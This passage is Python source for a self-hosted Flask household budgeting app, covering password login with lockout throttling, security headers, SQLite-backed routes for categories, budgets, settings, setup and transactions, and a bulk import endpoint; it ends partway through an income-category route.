from flask import (Flask, render_template, request, jsonify, Response, g,
                   redirect, session, url_for)
import logging
import secrets
import sqlite3
import csv
import io
import os
import time
from datetime import datetime

from werkzeug.security import check_password_hash

import env_file

env_file.load()  # before anything reads os.environ below

app = Flask(__name__)
app.json.sort_keys = False
DB_PATH = os.environ.get(
    'BUDGET_DB',
    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'budget.db')
)

from migrations import migrate
import presets

migrate(DB_PATH)


# ── authentication ────────────────────────────────────────────────────────────
#
# One household, one password — there is no user table and no per-user data.
# Leaving MB_PASSWORD_HASH empty disables the login entirely, which is a
# reasonable choice behind a VPN and a terrible one on a public address, so it
# is logged loudly at startup rather than assumed.

PASSWORD_HASH = os.environ.get('MB_PASSWORD_HASH', '')

# The pipeline is not a browser and cannot hold a session, so it presents this.
API_TOKEN = os.environ.get('MB_API_TOKEN', '')

app.secret_key = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
# Set MB_HTTPS=1 when something in front of this terminates TLS. Without it the
# session cookie is also sent over plain HTTP, which on a Tailscale funnel or any
# public hostname means the cookie travels in the clear on the first http:// hit.
# It defaults off because the plain-LAN install is http and the flag would make
# the cookie silently never arrive.
app.config['SESSION_COOKIE_SECURE'] = os.environ.get('MB_HTTPS') == '1'
app.permanent_session_lifetime = 60 * 60 * 24 * 30  # a month; this is a home app

if not PASSWORD_HASH:
    logging.getLogger(__name__).warning(
        'MB_PASSWORD_HASH is not set: every endpoint, including the full ledger '
        'export and DELETE, is reachable by anyone who can connect. Only do this '
        'behind a VPN or an IP allowlist.')
elif not os.environ.get('SECRET_KEY'):
    logging.getLogger(__name__).warning(
        'SECRET_KEY is not set: a random one is generated per process, so every '
        'restart (and every gunicorn worker) logs everyone out.')

# Reachable without logging in: the login form itself, static assets, and the
# service worker and manifest, which the browser fetches outside the session.
PUBLIC_PATHS = {'/login', '/sw.js', '/manifest.webmanifest', '/favicon.ico'}


@app.before_request
def require_login():
    if not PASSWORD_HASH:
        return None
    if request.path in PUBLIC_PATHS or request.path.startswith('/static/'):
        return None
    if session.get('authed'):
        return None
    if API_TOKEN and secrets.compare_digest(request.headers.get('X-MB-Token', ''), API_TOKEN):
        return None
    if request.path.startswith('/api/'):
        return jsonify({'error': 'authentication required'}), 401
    return redirect(url_for('login', next=request.path))


@app.before_request
def redirect_to_setup():
    """A brand new install has no categories, so every page would be blank."""
    if request.path.startswith(('/setup', '/static', '/api', '/login', '/logout', '/sw.js')):
        return None
    if needs_setup(get_db()):
        return redirect('/setup')
    return None


# ── login throttle ────────────────────────────────────────────────────────────
#
# Five wrong passwords from one address, then it waits. The hash is slow enough
# to make offline cracking expensive, but nothing stopped an online script from
# grinding through a weak password at a few hundred tries a minute.
#
# Kept in this process on purpose: the service runs a single gunicorn worker
# (SQLite takes one writer), so one dict sees every attempt. Raising the worker
# count means moving this to the database.
MAX_LOGIN_ATTEMPTS = 5
LOGIN_LOCKOUT_SECONDS = 15 * 60
_login_failures = {}  # ip -> [count, locked_until_monotonic]


def _client_ip():
    """The peer as the proxy saw it.

    nginx appends to X-Forwarded-For rather than replacing it, so the FIRST entry
    is whatever the client sent and can be rotated per request to sidestep the
    lockout entirely. The last entry is the one nginx wrote — the real peer for
    the single-hop setup the shipped template describes.
    """
    fwd = request.headers.get('X-Forwarded-For', '')
    if fwd:
        return fwd.split(',')[-1].strip()
    return request.remote_addr or '-'


def _login_locked(ip):
    entry = _login_failures.get(ip)
    # entry[1] == 0 means "counting, not locked yet". Treating that as an expired
    # lock dropped the counter on every attempt, so it never reached the limit.
    if not entry or not entry[1]:
        return 0
    remaining = entry[1] - time.monotonic()
    if remaining <= 0:
        _login_failures.pop(ip, None)
        return 0
    return int(remaining)


def _note_login_failure(ip):
    entry = _login_failures.setdefault(ip, [0, 0.0])
    entry[0] += 1
    if entry[0] >= MAX_LOGIN_ATTEMPTS:
        entry[1] = time.monotonic() + LOGIN_LOCKOUT_SECONDS
        entry[0] = 0


@app.route('/login', methods=['GET', 'POST'])
def login():
    if not PASSWORD_HASH:
        return redirect('/')
    error = None
    if request.method == 'POST':
        ip = _client_ip()
        locked_for = _login_locked(ip)
        if locked_for:
            # Logged, so a real lockout is visible in the journal rather than
            # only being reported by whoever got locked out.
            app.logger.warning('login locked out for %s (%ds left)', ip, locked_for)
            error = f'Too many attempts. Try again in {locked_for // 60 + 1} min.'
            return render_template('login.html', error=error), 429
        if check_password_hash(PASSWORD_HASH, request.form.get('password', '')):
            _login_failures.pop(ip, None)
            session.permanent = True
            session['authed'] = True
            nxt = request.args.get('next', '/')
            # Only ever redirect within this app, never to a supplied URL.
            return redirect(nxt if nxt.startswith('/') and not nxt.startswith('//') else '/')
        _note_login_failure(ip)
        app.logger.warning('failed login from %s', ip)
        error = 'Wrong password'
    return render_template('login.html', error=error), (401 if error else 200)


@app.after_request
def security_headers(resp):
    resp.headers.setdefault('X-Content-Type-Options', 'nosniff')
    resp.headers.setdefault('X-Frame-Options', 'DENY')
    resp.headers.setdefault('Referrer-Policy', 'same-origin')
    # Everything the pages load is served from here — no CDN, no inline <script>
    # beyond the config blob, no external images.
    resp.headers.setdefault(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'")
    return resp


@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')


# ── db ────────────────────────────────────────────────────────────────────────

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
        g.db.execute('PRAGMA foreign_keys = ON')
        g.db.execute('PRAGMA busy_timeout = 5000')
    return g.db


@app.teardown_appcontext
def close_db(e=None):
    db = g.pop('db', None)
    if db is not None:
        db.close()


# ── helpers ───────────────────────────────────────────────────────────────────

TX_TYPES = ('Expense', 'Income', 'Money Transfer', 'Balance Adjust')


class BadInput(Exception):
    """Raised by the parse_* helpers; turned into a 400 by the error handler below."""


@app.errorhandler(BadInput)
def handle_bad_input(e):
    return jsonify({'error': str(e)}), 400


@app.errorhandler(sqlite3.IntegrityError)
def handle_integrity_error(e):
    # A bad category_id, a duplicate account name or a NOT NULL violation is bad input,
    # not a server fault — one handler beats a try/except around every writer.
    return jsonify({'error': f'rejected by the database: {e}'}), 400


@app.errorhandler(500)
def handle_500(e):
    # Without this, Flask returns an HTML error page. Every frontend caller does
    # `.then(r => r.json())`, which then throws and aborts init(), leaving a blank
    # page that looks exactly like "all my data disappeared".
    return jsonify({'error': 'server error'}), 500


@app.context_processor
def static_version():
    """Cache-buster for /static refs. Templates linked style.css and app.js with no
    version, so a deploy could leave a browser running old JS against new HTML —
    the mixed-version state that renders a page looking like it lost its data."""
    static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
    try:
        newest = max(os.path.getmtime(os.path.join(static_dir, f))
                     for f in os.listdir(static_dir))
    except (OSError, ValueError):
        newest = 0
    return {'v': int(newest)}


def parse_money(value, field='amount'):
    """float() accepts 'inf' and 'nan'; inf survives into SQLite and makes json.dumps
    emit bare Infinity, which is invalid JSON — one bad row then breaks every endpoint."""
    try:
        out = float(value)
    except (TypeError, ValueError):
        raise BadInput(f'{field} must be a number')
    if out != out or out in (float('inf'), float('-inf')):
        raise BadInput(f'{field} must be a finite number')
    return out


def parse_int(value, field, lo=None, hi=None):
    try:
        out = int(value)
    except (TypeError, ValueError):
        raise BadInput(f'{field} must be a whole number')
    if (lo is not None and out < lo) or (hi is not None and out > hi):
        raise BadInput(f'{field} must be between {lo} and {hi}')
    return out


def month_year_args():
    """month/year from the query string, defaulting to now and rejecting junk."""
    now = datetime.now()
    return (parse_int(request.args.get('month', now.month), 'month', 1, 12),
            parse_int(request.args.get('year', now.year), 'year', 1970, 2200))


def category_name_map(db):
    """Returns dict: category_id → full MoneyPro name (e.g. 'Home: Garden')"""
    cats = db.execute('SELECT id, parent_id, name FROM categories').fetchall()
    by_id = {c['id']: c for c in cats}
    result = {}
    for c in cats:
        if c['parent_id'] is None:
            result[c['id']] = c['name']
        else:
            parent = by_id.get(c['parent_id'])
            result[c['id']] = f"{parent['name']}: {c['name']}" if parent else c['name']
    return result


def get_effective_basics(db, month, year):
    """BASIC per category for a given month: monthly override if set, else the legacy global value."""
    basics = {r['category_id']: r['amount'] for r in db.execute('SELECT * FROM basic_budgets').fetchall()}
    monthly = db.execute(
        'SELECT category_id, amount FROM basic_budgets_monthly WHERE month=? AND year=?', (month, year)
    ).fetchall()
    for r in monthly:
        basics[r['category_id']] = r['amount']
    return basics


def next_month_year(month, year):
    return (1, year + 1) if month == 12 else (month + 1, year)


def parse_flexible_date(date_str):
    """Sparsuj datę w DD/MM/YYYY, YYYY-MM-DD lub DD.MM.YYYY → datetime, albo None."""
    if not date_str:
        return None
    for fmt in ('%d/%m/%Y', '%Y-%m-%d', '%d.%m.%Y'):
        try:
            return datetime.strptime(date_str[:10], fmt)
        except ValueError:
            continue
    return None


def resolve_category(db, money_pro_name):
    """'Home: Garden' → category_id or None"""
    parts = money_pro_name.split(': ', 1)
    if len(parts) == 2:
        parent_name, child_name = parts
        row = db.execute(
            '''SELECT c.id FROM categories c
               JOIN categories p ON c.parent_id = p.id
               WHERE p.name = ? AND c.name = ?''',
            (parent_name, child_name)
        ).fetchone()
    else:
        row = db.execute(
            'SELECT id FROM categories WHERE name = ? AND parent_id IS NULL',
            (money_pro_name,)
        ).fetchone()
    return row['id'] if row else None


def resolve_income_category(db, money_pro_name):
    """'Partner salary' → income_category_id or None (case-insensitive, no parent/child split)."""
    if not money_pro_name or ': ' in money_pro_name:
        return None
    row = db.execute(
        'SELECT id FROM income_categories WHERE LOWER(name) = LOWER(?)',
        (money_pro_name,)
    ).fetchone()
    return row['id'] if row else None


def bump_income_received(db, income_category_id, month, year, amount):
    """Adds `amount` to income_entries.received for this category/month, creating the row if needed."""
    db.execute(
        '''INSERT INTO income_entries (category_id, month, year, planned, received, note)
           VALUES (?, ?, ?, 0, ?, '')
           ON CONFLICT(category_id, month, year) DO UPDATE SET received = received + excluded.received''',
        (income_category_id, month, year, amount)
    )


# ── settings ──────────────────────────────────────────────────────────────────

SETTING_DEFAULTS = {'currency': 'zł', 'locale': 'pl-PL'}


def get_settings(db):
    rows = db.execute('SELECT key, value FROM settings').fetchall()
    return {**SETTING_DEFAULTS, **{r['key']: r['value'] for r in rows}}


@app.context_processor
def inject_settings():
    """Currency and locale reach every template, so no page has to hardcode 'zł'."""
    return {'settings': get_settings(get_db())}


@app.route('/api/settings')
def api_settings():
    return jsonify(get_settings(get_db()))


@app.route('/api/settings', methods=['PUT'])
def update_settings():
    db = get_db()
    for key, value in (request.json or {}).items():
        db.execute('INSERT INTO settings (key, value) VALUES (?, ?) '
                   'ON CONFLICT(key) DO UPDATE SET value = excluded.value',
                   (key, str(value)))
    db.commit()
    return jsonify(get_settings(db))


# ── routes: first-run setup ───────────────────────────────────────────────────


def needs_setup(db):
    """An empty category tree means nobody has configured this install yet."""
    return not db.execute('SELECT 1 FROM categories LIMIT 1').fetchone()


@app.route('/setup')
def setup_page():
    return render_template('setup.html', presets=presets.list_presets(),
                           done=not needs_setup(get_db()))


@app.route('/api/setup/preset/<preset_id>')
def api_preset(preset_id):
    """The chosen preset's contents, so the user can uncheck what they don't want
    before any of it reaches the database."""
    try:
        return jsonify(presets.load_preset(preset_id))
    except (ValueError, FileNotFoundError):
        return jsonify({'error': 'no such preset'}), 404


@app.route('/api/setup', methods=['POST'])
def api_setup():
    """Apply the whole setup screen in one go.

    Refuses to run against a configured install: it would silently do nothing
    (apply_preset skips non-empty tables) and look like it had worked.
    """
    db = get_db()
    if not needs_setup(db):
        return jsonify({'error': 'This install is already set up. '
                                 'Edit categories and accounts from their own tabs.'}), 409

    data = request.json or {}
    preset_id = data.get('preset')
    preset = {'categories': [], 'income_categories': [], 'accounts': []}
    if preset_id:
        try:
            preset = presets.load_preset(preset_id)
        except (ValueError, FileNotFoundError):
            return jsonify({'error': f'no such preset: {preset_id}'}), 400

    presets.apply_preset(
        db, preset,
        categories=data.get('categories'),
        income_categories=data.get('income_categories'),
        accounts=data.get('accounts'),
    )

    settings = data.get('settings') or {}
    for key, value in settings.items():
        db.execute('INSERT INTO settings (key, value) VALUES (?, ?) '
                   'ON CONFLICT(key) DO UPDATE SET value = excluded.value',
                   (key, str(value)))

    for order, item in enumerate(data.get('calc_items') or []):
        name = (item.get('name') or '').strip()
        if not name:
            continue
        db.execute(
            'INSERT INTO calc_items (name, unit, time_input, rate, sort_order) VALUES (?, ?, ?, ?, ?)',
            (name, (item.get('unit') or '').strip(), 1 if item.get('time_input') else 0,
             parse_money(item.get('rate', 0), 'rate'), order))

    db.commit()
    return jsonify({'ok': True})

# ── routes: main ──────────────────────────────────────────────────────────────

@app.route('/')
def index():
    now = datetime.now()
    return render_template('index.html', month=now.month, year=now.year, active='/')


@app.route('/transactions')
def transactions_page():
    now = datetime.now()
    return render_template('transactions.html', month=now.month, year=now.year, active='/transactions')


@app.route('/m')
def mobile_page():
    now = datetime.now()
    return render_template('mobile.html', month=now.month, year=now.year)


@app.route('/sw.js')
def service_worker():
    # served from the root so the service worker scope covers the whole app
    return app.send_static_file('sw.js')


# ── routes: categories ────────────────────────────────────────────────────────

@app.route('/api/categories')
def api_categories():
    month, year = month_year_args()
    db = get_db()
    cats   = db.execute('SELECT * FROM categories ORDER BY CASE WHEN parent_id IS NULL THEN name END, parent_id, sort_order').fetchall()
    basics = get_effective_basics(db, month, year)

    groups = {}
    group_order = []
    children = {}
    for cat in cats:
        if cat['parent_id'] is None:
            groups[cat['id']] = {'id': cat['id'], 'name': cat['name'],
                                  'basic': basics.get(cat['id'], 0), 'children': []}
            group_order.append(cat['id'])
        else:
            children.setdefault(cat['parent_id'], []).append(
                {'id': cat['id'], 'name': cat['name'], 'basic': basics.get(cat['id'], 0)}
            )

    # sort groups A-Z
    group_order.sort(key=lambda gid: groups[gid]['name'])

    result = []
    for gid in group_order:
        g = groups[gid]
        # sort children A-Z
        g['children'] = sorted(children.get(gid, []), key=lambda c: c['name'])
        result.append(g)
    return jsonify(result)


@app.route('/api/categories', methods=['POST'])
def add_category():
    """Adds a top-level category (parent_id omitted) or a subcategory (parent_id set)."""
    data      = request.json
    db        = get_db()
    parent_id = data.get('parent_id')
    name      = (data.get('name') or '').strip()
    if not name:
        return jsonify({'error': 'Name is required.'}), 400
    max_order = db.execute(
        'SELECT COALESCE(MAX(sort_order)+1, 0) FROM categories WHERE parent_id IS ?', (parent_id,)
    ).fetchone()[0]
    cur = db.execute(
        'INSERT INTO categories (name, parent_id, sort_order) VALUES (?, ?, ?)',
        (name, parent_id, max_order)
    )
    db.commit()
    return jsonify({'ok': True, 'id': cur.lastrowid})


@app.route('/api/categories/<int:cid>', methods=['DELETE'])
def delete_category(cid):
    db = get_db()
    has_children = db.execute('SELECT 1 FROM categories WHERE parent_id=?', (cid,)).fetchone()
    if has_children:
        return jsonify({'error': 'This category has subcategories — delete them first.'}), 400
    try:
        db.execute('DELETE FROM categories WHERE id=?', (cid,))
        db.commit()
    except sqlite3.IntegrityError:
        db.rollback()
        return jsonify({'error': 'This category has budget or transaction data attached — cannot delete.'}), 400
    return jsonify({'ok': True})


# ── routes: budget ────────────────────────────────────────────────────────────

@app.route('/api/budget')
def api_budget():
    month, year = month_year_args()
    db    = get_db()

    additionals = db.execute(
        'SELECT * FROM additional_budgets WHERE month=? AND year=?', (month, year)
    ).fetchall()
    by_cat = {}
    for r in additionals:
        by_cat.setdefault(r['category_id'], []).append(
            {'id': r['id'], 'amount': r['amount'], 'description': r['description']}
        )

    # Same spend filter as /api/overview and /api/export/budget.csv — all three must agree.
    # A Money Transfer can carry a category_id (transfers get categorized like any other row),
    # but it is money moved between our own accounts, not spending.
    actuals = db.execute(
        '''SELECT category_id, SUM(amount) as total FROM transactions
           WHERE month=? AND year=? AND tx_type NOT IN ('Money Transfer', 'Balance Adjust', 'Income')
             AND income_category_id IS NULL
           GROUP BY category_id''',
        (month, year)
    ).fetchall()
    spent = {r['category_id']: r['total'] for r in actuals}

    income = db.execute(
        'SELECT COALESCE(SUM(planned), 0) FROM income_entries WHERE month=? AND year=?',
        (month, year)
    ).fetchone()[0]
    income_received = db.execute(
        'SELECT COALESCE(SUM(received), 0) FROM income_entries WHERE month=? AND year=?',
        (month, year)
    ).fetchone()[0]
    if income == 0:
        row = db.execute('SELECT amount FROM monthly_income WHERE month=? AND year=?', (month, year)).fetchone()
        income = row['amount'] if row else 0

    return jsonify({
        'additionals': by_cat,
        'income_received': income_received,
        'spent': spent,
        'income': income,
    })


@app.route('/api/basic', methods=['POST'])
def set_basic():
    data  = request.json
    db    = get_db()
    month = parse_int(data.get('month', datetime.now().month), 'month', 1, 12)
    year  = parse_int(data.get('year', datetime.now().year), 'year', 1970, 2200)
    db.execute(
        'INSERT INTO basic_budgets_monthly (category_id, month, year, amount) VALUES (?, ?, ?, ?)'
        ' ON CONFLICT(category_id, month, year) DO UPDATE SET amount=excluded.amount',
        (data['category_id'], month, year, parse_money(data.get('amount')))
    )
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/basic/copy-next', methods=['POST'])
def copy_basic_next_month():
    """Copies this month's effective BASIC amounts forward into next month."""
    data  = request.json
    month = parse_int(data.get('month'), 'month', 1, 12)
    year  = parse_int(data.get('year'), 'year', 1970, 2200)
    next_m, next_y = next_month_year(month, year)
    db = get_db()
    basics = get_effective_basics(db, month, year)
    for cat_id, amount in basics.items():
        db.execute(
            'INSERT INTO basic_budgets_monthly (category_id, month, year, amount) VALUES (?, ?, ?, ?)'
            ' ON CONFLICT(category_id, month, year) DO UPDATE SET amount=excluded.amount',
            (cat_id, next_m, next_y, amount)
        )
    db.commit()
    return jsonify({'ok': True, 'month': next_m, 'year': next_y})


@app.route('/api/additional', methods=['POST'])
def add_additional():
    data = request.json
    db   = get_db()
    db.execute(
        'INSERT INTO additional_budgets (category_id, amount, description, month, year) VALUES (?, ?, ?, ?, ?)',
        (data['category_id'], parse_money(data.get('amount')), data.get('description', ''),
         parse_int(data.get('month'), 'month', 1, 12), parse_int(data.get('year'), 'year', 1970, 2200))
    )
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/additional/<int:aid>', methods=['DELETE'])
def delete_additional(aid):
    db = get_db()
    db.execute('DELETE FROM additional_budgets WHERE id=?', (aid,))
    db.commit()
    return jsonify({'ok': True})


# ── routes: big expenses ──────────────────────────────────────────────────────

@app.route('/api/big-expenses')
def get_big_expenses():
    year = parse_int(request.args.get('year', datetime.now().year), 'year', 1970, 2200)
    db   = get_db()
    rows = db.execute('SELECT id,description,amount,done,year,sort_order,planned_month FROM big_expenses WHERE year=? ORDER BY sort_order, id', (year,)).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route('/api/big-expenses', methods=['POST'])
def add_big_expense():
    data = request.json
    year = data['year']
    db   = get_db()
    max_order = db.execute(
        'SELECT COALESCE(MAX(sort_order)+1, 0) FROM big_expenses WHERE year=?', (year,)
    ).fetchone()[0]
    db.execute(
        'INSERT INTO big_expenses (description, amount, year, sort_order, planned_month) VALUES (?, ?, ?, ?, ?)',
        (data['description'], parse_money(data.get('amount')), year, max_order, data.get('planned_month'))
    )
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/big-expenses/<int:eid>', methods=['PUT'])
def update_big_expense(eid):
    data = request.json
    db   = get_db()
    db.execute(
        'UPDATE big_expenses SET description=?, amount=?, done=?, planned_month=? WHERE id=?',
        (data.get('description', ''), parse_money(data.get('amount', 0)),
         1 if data.get('done') else 0,
         data.get('planned_month'), eid)
    )
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/big-expenses/<int:eid>', methods=['DELETE'])
def delete_big_expense(eid):
    db = get_db()
    db.execute('DELETE FROM big_expenses WHERE id=?', (eid,))
    db.commit()
    return jsonify({'ok': True})


# ── routes: transactions ──────────────────────────────────────────────────────

@app.route('/api/transactions')
def get_transactions():
    month, year = month_year_args()
    category_id = request.args.get('category_id', type=int)
    db          = get_db()

    query = '''SELECT t.id, t.date, t.amount, t.account, t.account_to, t.tx_type,
                      t.description, t.category_id, t.income_category_id,
                      c.name as cat_name, p.name as parent_name, ic.name as income_cat_name
               FROM transactions t
               LEFT JOIN categories c ON t.category_id = c.id
               LEFT JOIN categories p ON c.parent_id = p.id
               LEFT JOIN income_categories ic ON t.income_category_id = ic.id
               WHERE t.month=? AND t.year=?'''
    params = [month, year]
    if category_id is not None:
        query += ' AND t.category_id=?'
        params.append(category_id)
    query += ' ORDER BY t.date DESC, t.id DESC'

    rows = db.execute(query, params).fetchall()

    result = []
    for r in rows:
        desc = r['description'] or ''
        if r['tx_type'] == 'Money Transfer' and r['account_to']:
            desc = f"→ {r['account_to']}" + (f" ({desc})" if desc else '')
        result.append({
            'id':                 r['id'],
            'date':               r['date'],
            'amount':             r['amount'],
            'account':            r['account'],
            'account_to':         r['account_to'],
            'tx_type':            r['tx_type'],
            'description':        desc,
            'category_id':        r['category_id'],
            'cat_name':           r['cat_name'],
            'parent_name':        r['parent_name'],
            'income_category_id': r['income_category_id'],
            'income_cat_name':    r['income_cat_name'],
        })
    return jsonify(result)


@app.route('/api/transactions/bulk', methods=['POST'])
def bulk_transactions():
    """Called by push_actuals.py on Mac after each import.

    Returns the hashes this call actually took responsibility for, so the caller can
    record only those. It used to return a bare count while the caller marked every
    candidate as pushed — a row skipped here (unparseable date, constraint violation)
    was then never retried by any later run, and the money silently went missing."""
    data = request.json
    if not isinstance(data, list):
        raise BadInput('expected a list of transactions')
    db   = get_db()
    inserted = 0
    accepted = []
    for tx in data:
        if not isinstance(tx, dict):
            raise BadInput('each transaction must be an object')
        raw_cat = tx.get('category', '')
        row_type = tx.get('tx_type', 'Expense')
        if raw_cat.strip().upper() == 'CHECK ME':
            # "CHECK ME" is a fallback label for uncertain EXPENSES (rules.json) that
            # also happens to be a real income category name — resolving it here would
            # misfile uncertain expenses as income. Leave both unresolved so it lands
            # on the CHECK ME review page instead.
            cat_id = None
            income_cat_id = None
        elif row_type == 'Income':
            # tx_type decides which side of a name collision wins. 'Gifts' and 'ZUS'
            # exist as both an expense and an income category; resolving expense-first
            # filed income rows under the expense category, so bump_income_received
            # never fired and the money never reached income_entries.received.
            income_cat_id = resolve_income_category(db, raw_cat)
            cat_id = None
        else:
            # An expense never carries an income category — that combination makes
            # tx_type and income_category_id disagree about direction, and
            # balance_delta_since_anchor trusts income_category_id, so the row flips
            # the balance the wrong way. Unresolved is better: it lands on CHECK ME.
            cat_id = resolve_category(db, raw_cat)
            income_cat_id = None
        try:
            dt = parse_flexible_date(tx.get('date'))
            if dt is None:
                app.logger.warning('bulk import: unparseable date, row skipped: %r', tx)
                continue
            amount = parse_money(tx.get('amount'))

            cur = db.execute(
                '''INSERT OR IGNORE INTO transactions
                   (date, amount, account, account_to, tx_type, description,
                    category_id, income_category_id, month, year, source_hash)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (dt.strftime('%Y-%m-%d'), amount,
                 tx.get('account', ''), tx.get('account_to', ''),
                 row_type,
                 tx.get('description', ''), cat_id, income_cat_id,
                 dt.month, dt.year, tx.get('hash'))
            )
            if cur.rowcount and income_cat_id is not None:
                bump_income_received(db, income_cat_id, dt.month, dt.year, amount)
            inserted += cur.rowcount
            # rowcount 0 means OR IGNORE hit the unique source_hash — already stored,
            # so it counts as accepted too. Only rows that raised are left out.
            if tx.get('hash'):
                accepted.append(tx['hash'])
        except Exception:
            app.logger.exception('bulk import: skipping malformed transaction %r', tx)
            continue
    db.commit()
    return jsonify({'ok': True, 'inserted': inserted,
                    'accepted': accepted, 'received': len(data)})


@app.route('/api/transactions', methods=['POST'])
def add_transaction():
    data = request.json
    db = get_db()
    if 'date' in data:
        dt = parse_flexible_date(data['date'])
        if dt is None:
            return jsonify({'error': 'invalid date'}), 400
    else:
        dt = datetime.now()

    tx_type    = data.get('tx_type', 'Expense')
    account_to = data.get('account_to', '')
    if tx_type == 'Money Transfer' and (not data.get('account') or not account_to):
        return jsonify({'error': 'A transfer needs both accounts.'}), 400
    if tx_type == 'Income' and not data.get('account'):
        return jsonify({'error': 'Income needs an account.'}), 400
    cat_id        = data.get('category_id')
    income_cat_id = data.get('income_category_id') if tx_type == 'Income' else None
    amount        = parse_money(data.get('amount', 0))
    db.execute(
        '''INSERT INTO transactions (date, amount, account, account_to, description,
           category_id, income_category_id, tx_type, month, year) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (dt.strftime('%Y-%m-%d'), amount, data.get('account', ''),
         account_to, data.get('description', ''), cat_id, income_cat_id, tx_type, dt.month, dt.year)
    )
    if income_cat_id is not None:
        bump_income_received(db, income_cat_id, dt.month, dt.year, amount)
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/transactions/<int:tid>', methods=['PUT'])
def update_transaction(tid):
    data = request.json
    db = get_db()
    tx = db.execute('SELECT * FROM transactions WHERE id=?', (tid,)).fetchone()
    if not tx:
        return jsonify({'error': 'not found'}), 404

    fields = {}
    if 'date' in data:
        dt = parse_flexible_date(data['date'])
        if dt is None:
            return jsonify({'error': 'invalid date'}), 400
        fields['date'] = dt.strftime('%Y-%m-%d')
        fields['month'] = dt.month
        fields['year'] = dt.year
    if 'amount' in data:
        fields['amount'] = parse_money(data['amount'])
    if 'account' in data:
        fields['account'] = data['account']
    if 'description' in data:
        fields['description'] = data['description']
    if 'category_id' in data:
        new_cat = data['category_id']
        old_cat = tx['category_id']
        fields['category_id'] = new_cat
        if new_cat != old_cat:
            db.execute('INSERT INTO corrections (tx_id, old_category_id, new_category_id) VALUES (?, ?, ?)',
                      (tid, old_cat, new_cat))
    if 'account_to' in data:
        fields['account_to'] = data['account_to']

    unbump_income = False
    if 'tx_type' in data and data['tx_type'] != tx['tx_type']:
        new_type = data['tx_type']
        if new_type not in TX_TYPES:
            raise BadInput(f'tx_type must be one of: {", ".join(TX_TYPES)}')
        # A transfer with no destination is money debited from one account and credited
        # to nothing — balance_delta_since_anchor subtracts it and the amount vanishes.
        # The create path already refuses this; the edit path used to allow it.
        if new_type == 'Money Transfer' and not (fields.get('account_to') or tx['account_to']):
            raise BadInput('A transfer needs a destination account.')
        fields['tx_type'] = new_type
        # each type owns different side fields — clear whatever the new type doesn't use
        if new_type != 'Expense':
            fields.setdefault('category_id', None)
        if new_type != 'Money Transfer':
            fields.setdefault('account_to', '')
        if new_type != 'Income' and tx['income_category_id'] is not None:
            unbump_income = True
            fields['income_category_id'] = None

    if fields:
        set_clause = ', '.join(f'{k}=?' for k in fields)
        db.execute(f'UPDATE transactions SET {set_clause} WHERE id=?',
                  list(fields.values()) + [tid])
        if unbump_income:
            bump_income_received(db, tx['income_category_id'], tx['month'], tx['year'], -tx['amount'])
        # income transactions credit income_entries.received at insert time —
        # keep that in sync when the amount or month changes
        if tx['income_category_id'] is not None and not unbump_income and (
                'amount' in fields or 'month' in fields):
            new_amount = fields.get('amount', tx['amount'])
            new_month  = fields.get('month', tx['month'])
            new_year   = fields.get('year', tx['year'])
            bump_income_received(db, tx['income_category_id'], tx['month'], tx['year'], -tx['amount'])
            bump_income_received(db, tx['income_category_id'], new_month, new_year, new_amount)
        db.commit()
    return jsonify({'ok': True})


@app.route('/api/transactions/<int:tid>', methods=['DELETE'])
def delete_transaction(tid):
    db = get_db()
    tx = db.execute('SELECT * FROM transactions WHERE id=?', (tid,)).fetchone()
    if not tx:
        return jsonify({'error': 'not found'}), 404
    if tx['income_category_id'] is not None:
        bump_income_received(db, tx['income_category_id'], tx['month'], tx['year'], -tx['amount'])
    db.execute('DELETE FROM corrections WHERE tx_id=?', (tid,))
    db.execute('DELETE FROM transactions WHERE id=?', (tid,))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/transactions/unreviewed')
def get_unreviewed_transactions():
    """CHECK ME tab: transactions that never resolved to an expense OR income category.
    All-time, not scoped to a month — a review inbox shouldn't lose items when you flip months."""
    db = get_db()
    rows = db.execute(
        '''SELECT id, date, amount, account, description, tx_type
           FROM transactions
           WHERE category_id IS NULL AND income_category_id IS NULL
             AND tx_type NOT IN ('Balance Adjust', 'Money Transfer')
             AND ignored = 0
           ORDER BY date DESC, id DESC'''
    ).fetchall()

    # tx_type is the direction signal — amount is always stored positive for
    # Expense-type rows, so it can't be used to tell expenses from income.
    expenses = [dict(r) for r in rows if r['tx_type'] != 'Income']
    income   = [dict(r) for r in rows if r['tx_type'] == 'Income']
    return jsonify({'expenses': expenses, 'income': income})


@app.route('/api/transactions/unreviewed/count')
def get_unreviewed_count():
    db = get_db()
    n = db.execute(
        '''SELECT COUNT(*) FROM transactions
           WHERE category_id IS NULL AND income_category_id IS NULL
             AND tx_type NOT IN ('Balance Adjust', 'Money Transfer')
             AND ignored = 0'''
    ).fetchone()[0]
    return jsonify({'count': n})


@app.route('/api/transactions/<int:tid>/ignore', methods=['PUT'])
def ignore_transaction(tid):
    """Dismiss a CHECK ME transaction without assigning a category — it stays
    on the transactions list as uncategorized instead of nagging for review."""
    db = get_db()
    tx = db.execute('SELECT id FROM transactions WHERE id=?', (tid,)).fetchone()
    if not tx:
        return jsonify({'error': 'not found'}), 404
    db.execute('UPDATE transactions SET ignored=1 WHERE id=?', (tid,))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/transactions/<int:tid>/income-category', methods=['PUT'])
def set_tx_income_category(tid):
    """Assigns a CHECK ME income transaction to an income category, crediting income_entries.received."""
    data = request.json
    db   = get_db()
